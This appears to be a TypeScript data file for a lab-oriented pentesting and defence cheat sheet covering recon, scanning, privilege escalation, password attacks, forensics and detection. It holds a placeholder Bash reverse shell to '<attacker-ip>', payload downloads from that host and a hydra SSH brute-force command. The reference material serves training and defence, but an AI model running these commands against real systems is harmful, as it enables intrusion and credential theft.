export type CheatSheetCategory =
  | 'Recon'
  | 'Nmap'
  | 'Web Enumeration'
  | 'Fuzzing'
  | 'Linux Privilege Escalation'
  | 'Windows Enumeration'
  | 'Active Directory Basics'
  | 'Reverse Shells'
  | 'File Transfer'
  | 'Password Attacks'
  | 'Forensics'
  | 'Malware Analysis Basics'
  | 'SOC / Detection'
  | 'Useful Links';

export type CheatSheetLanguage = 'bash' | 'powershell' | 'yaml' | 'yara' | 'text';

export type CheatSheetEntry = {
  title: string;
  command: string;
  language: CheatSheetLanguage;
  description: string;
  whenToUse: string;
  notes: string;
  exampleOutput?: string;
  tags: string[];
};

export type CheatSheetCategorySection = {
  category: CheatSheetCategory;
  slug: string;
  summary: string;
  entries: CheatSheetEntry[];
};

export const categoryOrder: CheatSheetCategory[] = [
  'Recon',
  'Nmap',
  'Web Enumeration',
  'Fuzzing',
  'Linux Privilege Escalation',
  'Windows Enumeration',
  'Active Directory Basics',
  'Reverse Shells',
  'File Transfer',
  'Password Attacks',
  'Forensics',
  'Malware Analysis Basics',
  'SOC / Detection',
  'Useful Links'
];

export const cheatSheetSections: CheatSheetCategorySection[] = [
  {
    category: 'Recon',
    slug: 'recon',
    summary: 'Quiet first-pass discovery for scope, DNS, ownership, TLS, and exposed HTTP behavior.',
    entries: [
      {
        title: 'WHOIS ownership lookup',
        command: 'whois <domain>',
        language: 'bash',
        description: 'Queries public registration data for a domain, including registrar, name servers, and contact metadata when available.',
        whenToUse: 'Use at the start of authorized external recon to understand ownership and DNS delegation.',
        notes: 'WHOIS data can be privacy-protected or stale. Treat it as context, not proof of control.',
        exampleOutput: 'Registrar, creation date, name server, and registry status fields.',
        tags: ['dns', 'osint', 'scope']
      },
      {
        title: 'DNS record sweep',
        command: 'dig <domain> A AAAA MX TXT NS +short',
        language: 'bash',
        description: 'Requests common DNS record types and prints compact answers for quick review.',
        whenToUse: 'Use when mapping mail, name server, and verification records for an approved domain.',
        notes: 'Compare answers from more than one resolver if results look inconsistent.',
        tags: ['dns', 'records', 'recon']
      },
      {
        title: 'Certificate subject names',
        command: 'echo | openssl s_client -connect <domain>:443 -servername <domain> 2>/dev/null | openssl x509 -noout -subject -issuer -dates -ext subjectAltName',
        language: 'bash',
        description: 'Connects to a TLS service and extracts certificate identity, issuer, validity dates, and subject alternative names.',
        whenToUse: 'Use when validating hostnames, expired certificates, or adjacent names in authorized infrastructure.',
        notes: 'Certificate names can reveal related assets, but they do not automatically expand testing scope.',
        tags: ['tls', 'certificate', 'scope']
      },
      {
        title: 'HTTP headers only',
        command: 'curl -I https://<domain>/',
        language: 'bash',
        description: 'Fetches response headers without downloading the full response body.',
        whenToUse: 'Use to inspect server hints, redirects, cookies, and security headers with minimal traffic.',
        notes: 'Headers can differ by path, method, host header, and authentication state.',
        tags: ['http', 'headers', 'curl']
      }
    ]
  },
  {
    category: 'Nmap',
    slug: 'nmap',
    summary: 'Port and service discovery patterns for lab hosts and written-scope targets.',
    entries: [
      {
        title: 'TCP SYN scan',
        command: 'sudo nmap -sS -Pn -p- --min-rate 2000 <target>',
        language: 'bash',
        description: 'Performs a full TCP port sweep using SYN scanning and treats the host as online.',
        whenToUse: 'Use during authorized lab enumeration when ICMP ping is blocked or unreliable.',
        notes: 'Can be noisy. Confirm scope before running against any target.',
        exampleOutput: 'Open TCP ports such as 22/tcp, 80/tcp, or 443/tcp.',
        tags: ['tcp', 'ports', 'syn']
      },
      {
        title: 'Service and version detection',
        command: 'nmap -sCV -p <ports> -oA scans/services <target>',
        language: 'bash',
        description: 'Runs default scripts and version detection against selected ports, saving output in multiple formats.',
        whenToUse: 'Use after a port sweep to identify services, versions, and common misconfigurations.',
        notes: 'Default scripts are usually safe in labs, but still more intrusive than a simple connect scan.',
        tags: ['services', 'versions', 'scripts']
      },
      {
        title: 'Top UDP ports',
        command: 'sudo nmap -sU --top-ports 50 -oA scans/udp-top <target>',
        language: 'bash',
        description: 'Checks the most common UDP ports and writes normal, grepable, and XML output.',
        whenToUse: 'Use when TCP results are sparse or when DNS, SNMP, NTP, or VPN services may exist.',
        notes: 'UDP scans are slow and can produce ambiguous open|filtered results.',
        tags: ['udp', 'services', 'triage']
      },
      {
        title: 'Save grepable scan output',
        command: 'nmap -Pn -p <ports> -oA scans/<target>-selected <target>',
        language: 'bash',
        description: 'Runs a scoped scan and saves output as normal, grepable, and XML files under one basename.',
        whenToUse: 'Use whenever scan results need to be reproducible or referenced later in notes.',
        notes: 'Keep scan filenames generic if reports may be shared outside a private lab.',
        tags: ['output', 'notes', 'evidence']
      }
    ]
  },
  {
    category: 'Web Enumeration',
    slug: 'web-enumeration',
    summary: 'HTTP request inspection, virtual host checks, and source review for web labs.',
    entries: [
      {
        title: 'Full HTTP response',
        command: 'curl -i http://<target>/',
        language: 'bash',
        description: 'Prints response headers and body for a single HTTP request.',
        whenToUse: 'Use to inspect redirects, cookies, status codes, and visible source from a web service.',
        notes: 'Review state-changing actions in a proxy before replaying or modifying requests.',
        tags: ['curl', 'headers', 'http']
      },
      {
        title: 'Virtual host probe',
        command: 'curl -H "Host: <domain>" -i http://<ip>/',
        language: 'bash',
        description: 'Sends a custom Host header to an IP address to test name-based virtual hosting.',
        whenToUse: 'Use when DNS hints or certificates suggest multiple hostnames on one web server.',
        notes: 'Only test hostnames inside the authorized scope.',
        tags: ['vhost', 'host-header', 'http']
      },
      {
        title: 'Extract linked paths',
        command: 'curl -s http://<target>/ | grep -Eoi \'(href|src)="[^"]+\' | cut -d\'"\' -f2 | sort -u',
        language: 'bash',
        description: 'Downloads a page and extracts linked href and src values for quick manual review.',
        whenToUse: 'Use during first-pass web mapping to find static assets, routes, and client-side files.',
        notes: 'This does not replace crawling. JavaScript-rendered routes may not appear in raw HTML.',
        tags: ['links', 'source', 'routes']
      },
      {
        title: 'Inspect robots file',
        command: 'curl -s http://<target>/robots.txt',
        language: 'bash',
        description: 'Fetches robots.txt to review paths that the site asks crawlers to avoid.',
        whenToUse: 'Use when checking for intentionally exposed administrative, staging, or content paths.',
        notes: 'Robots entries are not access control. Verify paths manually and stay in scope.',
        tags: ['robots', 'paths', 'web']
      }
    ]
  },
  {
    category: 'Fuzzing',
    slug: 'fuzzing',
    summary: 'Controlled route, extension, parameter, and virtual host discovery with clear filters.',
    entries: [
      {
        title: 'Directory fuzzing',
        command: 'ffuf -u http://<target>/FUZZ -w <wordlist> -mc all -fc 404',
        language: 'bash',
        description: 'Tests paths from a wordlist and hides standard 404 responses.',
        whenToUse: 'Use in authorized labs after collecting a baseline response size and status code.',
        notes: 'Tune rate and filters. Blind high-speed fuzzing can be noisy and disruptive.',
        tags: ['ffuf', 'directories', 'wordlist']
      },
      {
        title: 'Extension fuzzing',
        command: 'ffuf -u http://<target>/FUZZ -w <wordlist> -e .php,.txt,.bak -fc 404',
        language: 'bash',
        description: 'Tests words with common file extensions appended.',
        whenToUse: 'Use when a server stack hints at backup files, scripts, or text artifacts.',
        notes: 'Do not assume a discovered backup file is safe to disclose publicly.',
        tags: ['extensions', 'backup', 'ffuf']
      },
      {
        title: 'Virtual host fuzzing',
        command: 'ffuf -u http://<ip>/ -H "Host: FUZZ.<domain>" -w <wordlist> -fs <size>',
        language: 'bash',
        description: 'Fuzzes subdomain labels by changing the Host header while connecting to a known IP.',
        whenToUse: 'Use when DNS, TLS, or app behavior suggests name-based routing.',
        notes: 'Use response size filters only after confirming the default invalid-host response.',
        tags: ['vhost', 'subdomain', 'host-header']
      },
      {
        title: 'Parameter name fuzzing',
        command: 'ffuf -u "http://<target>/page?FUZZ=test" -w <wordlist> -fs <size>',
        language: 'bash',
        description: 'Tests possible GET parameter names and filters out the baseline response size.',
        whenToUse: 'Use on lab endpoints where hidden parameters may change application behavior.',
        notes: 'Avoid sending payloads first. Find accepted parameter names before testing values.',
        tags: ['parameters', 'ffuf', 'web']
      }
    ]
  },
  {
    category: 'Linux Privilege Escalation',
    slug: 'linux-privilege-escalation',
    summary: 'Low-noise local enumeration after getting an authorized low-privileged shell.',
    entries: [
      {
        title: 'Identity and kernel context',
        command: 'id; hostname; uname -a; cat /etc/os-release 2>/dev/null',
        language: 'bash',
        description: 'Prints current user identity, host name, kernel details, and distribution release information.',
        whenToUse: 'Use immediately after landing in a Linux lab shell to establish local context.',
        notes: 'Do not jump to kernel exploits without confirming patch level and safer paths first.',
        tags: ['linux', 'identity', 'kernel']
      },
      {
        title: 'List sudo permissions',
        command: 'sudo -l',
        language: 'bash',
        description: 'Shows commands the current user may run through sudo and whether a password is required.',
        whenToUse: 'Use when checking for intended lab privilege boundaries or misconfigured sudo rules.',
        notes: 'Avoid running privileged commands until you understand their side effects.',
        tags: ['sudo', 'permissions', 'privesc']
      },
      {
        title: 'Search SUID binaries',
        command: 'find / -perm -4000 -type f 2>/dev/null',
        language: 'bash',
        description: 'Lists files with the SUID bit set, which may run with the file owner privileges.',
        whenToUse: 'Use during Linux privilege escalation review after gaining a low-privileged shell in a lab.',
        notes: 'Investigate unusual binaries manually. Do not assume every SUID binary is exploitable.',
        tags: ['suid', 'linux', 'permissions']
      },
      {
        title: 'Review file capabilities',
        command: 'getcap -r / 2>/dev/null',
        language: 'bash',
        description: 'Recursively lists Linux file capabilities that grant specific privileged operations.',
        whenToUse: 'Use when SUID checks are clean but binaries may have delegated privileges.',
        notes: 'Capabilities are granular. Confirm what each capability allows before testing.',
        tags: ['capabilities', 'linux', 'privesc']
      }
    ]
  },
  {
    category: 'Windows Enumeration',
    slug: 'windows-enumeration',
    summary: 'Windows host, user, service, task, and network context for approved labs.',
    entries: [
      {
        title: 'Current token details',
        command: 'whoami /all',
        language: 'powershell',
        description: 'Displays the current user, groups, privileges, and integrity level.',
        whenToUse: 'Use after obtaining a Windows shell to understand the current security context.',
        notes: 'Disabled privileges may still matter, but do not imply immediate administrative control.',
        tags: ['windows', 'token', 'privileges']
      },
      {
        title: 'System version summary',
        command: 'systeminfo',
        language: 'powershell',
        description: 'Prints OS version, build, hotfix, domain, boot time, and hardware summary.',
        whenToUse: 'Use during initial Windows enumeration to guide compatibility and patch-level research.',
        notes: 'Do not rely on OS build alone for vulnerability claims. Confirm installed patches.',
        tags: ['windows', 'system', 'patches']
      },
      {
        title: 'Auto-start services',
        command: 'Get-CimInstance Win32_Service | Where-Object {$_.StartMode -eq "Auto"} | Select-Object Name, State, StartName, PathName',
        language: 'powershell',
        description: 'Lists automatically starting services with state, service account, and executable path.',
        whenToUse: 'Use when reviewing persistence-like service behavior or weak service configuration in a lab.',
        notes: 'Service changes can break hosts. Inspect permissions before modifying anything.',
        tags: ['services', 'powershell', 'windows']
      },
      {
        title: 'Scheduled task review',
        command: 'Get-ScheduledTask | Select-Object TaskName, TaskPath, State',
        language: 'powershell',
        description: 'Lists scheduled tasks and their basic state for quick triage.',
        whenToUse: 'Use when looking for recurring scripts, maintenance jobs, or lab privilege boundaries.',
        notes: 'Task action details require additional review with Get-ScheduledTaskInfo or XML export.',
        tags: ['tasks', 'windows', 'enumeration']
      }
    ]
  },
  {
    category: 'Active Directory Basics',
    slug: 'active-directory-basics',
    summary: 'Domain context and LDAP/Kerberos checks for authorized AD practice networks.',
    entries: [
      {
        title: 'Domain controller discovery',
        command: 'nltest /dsgetdc:<domain>',
        language: 'powershell',
        description: 'Asks Windows to locate a domain controller for the specified domain.',
        whenToUse: 'Use on a domain-joined lab host to confirm domain name, DC, and site context.',
        notes: 'Only enumerate domains where you have explicit authorization.',
        tags: ['ad', 'domain-controller', 'windows']
      },
      {
        title: 'LDAP naming contexts',
        command: 'ldapsearch -x -H ldap://<ip> -s base namingcontexts',
        language: 'bash',
        description: 'Queries LDAP RootDSE for base naming contexts exposed by a directory server.',
        whenToUse: 'Use to identify domain distinguished names before scoped LDAP queries.',
        notes: 'Anonymous LDAP may be disabled. Authentication changes what you can see.',
        tags: ['ldap', 'rootdse', 'ad']
      },
      {
        title: 'Kerberos clock check',
        command: 'ntpdate -q <domain-controller-ip>',
        language: 'bash',
        description: 'Checks time offset against a domain controller without setting the local clock.',
        whenToUse: 'Use before Kerberos testing when authentication fails unexpectedly.',
        notes: 'Large time skew can break Kerberos. Fix your lab clock through approved means.',
        tags: ['kerberos', 'time', 'ad']
      },
      {
        title: 'Domain user listing',
        command: 'Get-ADUser -Filter * -Properties SamAccountName | Select-Object SamAccountName',
        language: 'powershell',
        description: 'Lists Active Directory user account names when the AD PowerShell module is available.',
        whenToUse: 'Use in an authorized admin or lab context to inventory accounts.',
        notes: 'Account lists are sensitive. Store outputs securely and sanitize reports.',
        tags: ['users', 'powershell', 'ad']
      }
    ]
  },
  {
    category: 'Reverse Shells',
    slug: 'reverse-shells',
    summary: 'Lab-safe listener and shell placeholders with explicit attacker IP and port fields.',
    entries: [
      {
        title: 'Netcat listener',
        command: 'nc -lvnp <port>',
        language: 'bash',
        description: 'Starts a TCP listener on a local port and prints incoming connection data.',
        whenToUse: 'Use in CTFs or isolated labs when an exercise requires receiving a reverse connection.',
        notes: 'Bind only on the intended lab interface and close the listener when finished.',
        tags: ['listener', 'tcp', 'lab']
      },
      {
        title: 'Bash reverse shell placeholder',
        command: 'bash -c \'bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1\'',
        language: 'bash',
        description: 'Starts an interactive Bash session that connects back to a listener.',
        whenToUse: 'Use only in controlled labs where reverse shell execution is explicitly part of the exercise.',
        notes: 'Replace placeholders with lab values. Do not run against systems outside written scope.',
        tags: ['bash', 'reverse-shell', 'placeholder']
      },
      {
        title: 'Python PTY upgrade',
        command: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
        language: 'bash',
        description: 'Spawns a pseudo-terminal to make a basic shell more usable.',
        whenToUse: 'Use after receiving a lab shell that lacks line editing or terminal behavior.',
        notes: 'This improves interaction but does not change authorization or privilege level.',
        tags: ['pty', 'shell', 'linux']
      },
      {
        title: 'Terminal sizing',
        command: 'export TERM=xterm; stty rows 40 cols 120',
        language: 'bash',
        description: 'Sets terminal type and dimensions for a shell session.',
        whenToUse: 'Use when full-screen tools render poorly after a lab shell is stabilized.',
        notes: 'Match rows and columns to your local terminal for best results.',
        tags: ['tty', 'terminal', 'shell']
      }
    ]
  },
  {
    category: 'File Transfer',
    slug: 'file-transfer',
    summary: 'Simple movement of tools, notes, and evidence with integrity checks.',
    entries: [
      {
        title: 'Serve a local folder',
        command: 'python3 -m http.server <port>',
        language: 'bash',
        description: 'Starts a basic HTTP server from the current directory.',
        whenToUse: 'Use inside a lab network to serve approved tools or notes to a target host.',
        notes: 'Serve from a clean folder and stop the process when transfer is complete.',
        tags: ['http', 'python', 'transfer']
      },
      {
        title: 'Download with curl',
        command: 'curl -O http://<attacker-ip>:<port>/<file>',
        language: 'bash',
        description: 'Downloads a file from an HTTP server and keeps the remote filename.',
        whenToUse: 'Use on Linux or macOS targets where curl is available.',
        notes: 'Hash files before and after transfer when preserving evidence integrity.',
        tags: ['curl', 'download', 'linux']
      },
      {
        title: 'PowerShell web download',
        command: 'Invoke-WebRequest -Uri "http://<attacker-ip>:<port>/<file>" -OutFile "<file>"',
        language: 'powershell',
        description: 'Downloads a file over HTTP using PowerShell.',
        whenToUse: 'Use in Windows labs when transferring approved scripts or evidence files.',
        notes: 'Respect execution policy and logging requirements in defensive environments.',
        tags: ['powershell', 'download', 'windows']
      },
      {
        title: 'SCP copy to remote host',
        command: 'scp <file> <user>@<ip>:/tmp/<file>',
        language: 'bash',
        description: 'Copies a file to a remote host over SSH.',
        whenToUse: 'Use when valid SSH access exists and a logged, authenticated transfer is preferred.',
        notes: 'Avoid placing files in sensitive system directories unless explicitly required.',
        tags: ['scp', 'ssh', 'transfer']
      }
    ]
  },
  {
    category: 'Password Attacks',
    slug: 'password-attacks',
    summary: 'Authorized password audit and offline hash cracking workflow notes.',
    entries: [
      {
        title: 'Identify hash format',
        command: 'hashid <hash-file>',
        language: 'bash',
        description: 'Attempts to identify possible hash algorithms from provided hash strings.',
        whenToUse: 'Use before choosing a cracking mode for legitimately obtained lab hashes.',
        notes: 'Hash identification can be ambiguous. Confirm with source context when possible.',
        tags: ['hashes', 'identification', 'offline']
      },
      {
        title: 'John wordlist crack',
        command: 'john --wordlist=<wordlist> <hash-file>',
        language: 'bash',
        description: 'Runs John the Ripper against a hash file using a specified wordlist.',
        whenToUse: 'Use for authorized offline password audits or CTF hash challenges.',
        notes: 'Handle recovered passwords as sensitive data and sanitize shared notes.',
        tags: ['john', 'wordlist', 'offline']
      },
      {
        title: 'Hashcat mode placeholder',
        command: 'hashcat -m <mode> <hash-file> <wordlist>',
        language: 'bash',
        description: 'Runs Hashcat with an explicit mode, hash file, and wordlist.',
        whenToUse: 'Use when you know the hash type and have permission to perform offline cracking.',
        notes: 'Wrong modes waste time and can produce misleading status output.',
        tags: ['hashcat', 'gpu', 'offline']
      },
      {
        title: 'Scoped SSH login audit',
        command: 'hydra -L <users> -P <wordlist> ssh://<target> -t 4',
        language: 'bash',
        description: 'Tests username and password combinations against SSH with a limited thread count.',
        whenToUse: 'Use only when online credential testing is explicitly allowed in the rules of engagement.',
        notes: 'Online tests are noisy and may trigger lockouts or alerts. Confirm written authorization first.',
        tags: ['hydra', 'ssh', 'online']
      }
    ]
  },
  {
    category: 'Forensics',
    slug: 'forensics',
    summary: 'Evidence triage commands for files, strings, metadata, hashes, and memory images.',
    entries: [
      {
        title: 'Identify file type',
        command: 'file <artifact>',
        language: 'bash',
        description: 'Inspects file signatures and metadata to guess the artifact type.',
        whenToUse: 'Use first when an extension is missing, misleading, or untrusted.',
        notes: 'Work from a copy of evidence and preserve the original artifact unchanged.',
        tags: ['file', 'triage', 'evidence']
      },
      {
        title: 'Extract printable strings',
        command: 'strings -a -n 6 <artifact> | less',
        language: 'bash',
        description: 'Shows printable strings of length six or more from a file.',
        whenToUse: 'Use to quickly spot paths, URLs, commands, user agents, or embedded messages.',
        notes: 'Strings are clues, not conclusions. Correlate them with other evidence.',
        tags: ['strings', 'triage', 'forensics']
      },
      {
        title: 'Metadata review',
        command: 'exiftool <artifact>',
        language: 'bash',
        description: 'Displays embedded metadata from images, documents, and other supported files.',
        whenToUse: 'Use when timestamps, author fields, software names, or GPS fields may matter.',
        notes: 'Metadata can be modified. Keep timezone assumptions explicit.',
        tags: ['metadata', 'exiftool', 'evidence']
      },
      {
        title: 'Memory image overview',
        command: 'volatility3 -f <memory-image> windows.info',
        language: 'bash',
        description: 'Runs a basic Volatility 3 plugin to identify Windows memory image details.',
        whenToUse: 'Use before selecting OS-specific memory forensics plugins.',
        notes: 'Large memory images can be slow. Record plugin versions for repeatability.',
        tags: ['memory', 'volatility', 'windows']
      }
    ]
  },
  {
    category: 'Malware Analysis Basics',
    slug: 'malware-analysis-basics',
    summary: 'Static-first analysis steps for isolated malware labs and defensive learning.',
    entries: [
      {
        title: 'Sample hashing',
        command: 'sha256sum <sample> && md5sum <sample>',
        language: 'bash',
        description: 'Calculates SHA-256 and MD5 hashes for a sample.',
        whenToUse: 'Use before analysis to create stable identifiers for reports and lab notes.',
        notes: 'Never upload sensitive client samples to public scanners without permission.',
        tags: ['hashes', 'sample', 'triage']
      },
      {
        title: 'Static strings capture',
        command: 'strings -a -n 6 <sample> | tee strings.txt',
        language: 'bash',
        description: 'Extracts printable strings and saves a copy for review.',
        whenToUse: 'Use during static triage to identify paths, imports, URLs, mutex names, or commands.',
        notes: 'Do not execute unknown samples on your host OS.',
        tags: ['strings', 'static', 'malware']
      },
      {
        title: 'YARA rule skeleton',
        command: 'rule Lab_Sample_Triage {\n  strings:\n    $s1 = "placeholder" ascii wide\n  condition:\n    $s1\n}',
        language: 'yara',
        description: 'Provides a minimal YARA structure for matching a known lab string.',
        whenToUse: 'Use when turning observed static indicators into a simple local detection rule.',
        notes: 'Replace placeholder strings with validated indicators and test against clean files.',
        tags: ['yara', 'detection', 'static']
      },
      {
        title: 'Offline YARA scan',
        command: 'yara -r <rules-file> <sample-directory>/',
        language: 'bash',
        description: 'Recursively scans a directory of samples with a YARA rule file.',
        whenToUse: 'Use in an isolated analysis VM to check sample sets against local rules.',
        notes: 'Recursive scans can be broad. Keep malware samples inside a dedicated lab folder.',
        tags: ['yara', 'scan', 'lab']
      }
    ]
  },
  {
    category: 'SOC / Detection',
    slug: 'soc-detection',
    summary: 'Alert triage, IOC extraction, and detection rule starting points.',
    entries: [
      {
        title: 'Extract common IOCs',
        command: 'grep -Eio "([0-9]{1,3}\\.){3}[0-9]{1,3}|[a-f0-9]{64}|https?://[^ ]+" <log-file> | sort -u',
        language: 'bash',
        description: 'Pulls rough IP addresses, SHA-256-like hashes, and URLs from a text log.',
        whenToUse: 'Use for quick triage when reviewing alert text or exported logs.',
        notes: 'Regex extraction can produce false positives. Validate indicators before blocking.',
        tags: ['ioc', 'logs', 'triage']
      },
      {
        title: 'Linux failed logins',
        command: 'grep -i "failed password" /var/log/auth.log | tail -50',
        language: 'bash',
        description: 'Shows recent failed SSH password events from a Linux auth log.',
        whenToUse: 'Use during defensive review of suspected brute-force activity on a lab or owned host.',
        notes: 'Log paths vary by distribution and logging configuration.',
        tags: ['ssh', 'linux', 'logs']
      },
      {
        title: 'Sigma rule skeleton',
        command: 'title: Suspicious Placeholder Event\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    Image|endswith: "\\\\placeholder.exe"\n  condition: selection\nlevel: low',
        language: 'yaml',
        description: 'Shows a minimal Sigma-style rule structure for a process creation detection idea.',
        whenToUse: 'Use when converting an observed lab behavior into a portable detection draft.',
        notes: 'Tune against known-good activity before deploying any detection broadly.',
        tags: ['sigma', 'yaml', 'detection']
      },
      {
        title: 'Convert Sigma placeholder',
        command: 'sigma-cli convert -t <backend> <rule-file>',
        language: 'bash',
        description: 'Converts a Sigma rule into a backend query format supported by your tooling.',
        whenToUse: 'Use after writing and validating a Sigma rule draft.',
        notes: 'Backend mappings differ. Review generated queries before production use.',
        tags: ['sigma', 'conversion', 'soc']
      }
    ]
  },
  {
    category: 'Useful Links',
    slug: 'useful-links',
    summary: 'Reference URLs and search patterns for verification, documentation, and defensive mapping.',
    entries: [
      {
        title: 'OWASP WSTG',
        command: 'https://owasp.org/www-project-web-security-testing-guide/',
        language: 'text',
        description: 'Primary web security testing guide for structured, authorized web assessment methodology.',
        whenToUse: 'Use when planning web test coverage or checking expected test categories.',
        notes: 'Use it for methodology. Write your own findings from verified evidence.',
        tags: ['owasp', 'web', 'methodology']
      },
      {
        title: 'MITRE ATT&CK',
        command: 'https://attack.mitre.org/',
        language: 'text',
        description: 'Knowledge base of adversary tactics, techniques, and procedures used for defensive mapping.',
        whenToUse: 'Use when mapping observed behavior or detections to ATT&CK techniques.',
        notes: 'Mapping should describe behavior you observed, not just tool names.',
        tags: ['mitre', 'attck', 'detection']
      },
      {
        title: 'GTFOBins',
        command: 'https://gtfobins.github.io/',
        language: 'text',
        description: 'Reference for Unix binaries that can be abused in misconfigured privilege contexts.',
        whenToUse: 'Use during CTF or lab privilege escalation review after finding allowed binaries.',
        notes: 'Do not paste techniques blindly. Validate the exact permissions and binary version.',
        tags: ['linux', 'privesc', 'reference']
      },
      {
        title: 'LOLBAS',
        command: 'https://lolbas-project.github.io/',
        language: 'text',
        description: 'Reference for Windows living-off-the-land binaries, scripts, and libraries.',
        whenToUse: 'Use for defensive detection ideas or authorized Windows lab review.',
        notes: 'Presence of a binary is normal. Focus on suspicious parent process, arguments, and context.',
        tags: ['windows', 'lolbas', 'detection']
      },
      {
        title: 'Vendor advisory search',
        command: 'site:<vendor-docs-domain> <product> <version> security advisory',
        language: 'text',
        description: 'Search pattern for finding primary vendor documentation about security fixes.',
        whenToUse: 'Use before citing vulnerability status, affected versions, or fixed versions.',
        notes: 'Prefer official advisories over reposted summaries when accuracy matters.',
        tags: ['advisory', 'research', 'verification']
      }
    ]
  }
];

export const cheatSheets = cheatSheetSections.flatMap((section) =>
  section.entries.map((entry) => ({
    ...entry,
    category: section.category,
    slug: section.slug
  }))
);
